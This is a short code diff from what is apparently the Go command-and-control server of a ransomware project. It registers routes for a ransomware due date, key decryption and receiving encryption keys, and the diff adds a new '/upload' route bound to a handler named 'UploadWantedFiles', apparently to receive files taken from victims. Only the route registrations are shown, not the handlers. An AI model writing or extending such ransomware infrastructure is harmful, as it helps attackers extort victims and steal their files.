@@ -49,6 +49,7 @@ func main() {
 	http.HandleFunc("/due", handlers.GetRansomwareDueDate)
 	http.HandleFunc("/decrypt", handlers.DecryptKey)
 	http.HandleFunc("/enckey", handlers.ReceiveEncryptionKey)
+	http.HandleFunc("/upload", handlers.UploadWantedFiles)
 
 	log.Print("server running on port 8080")
 
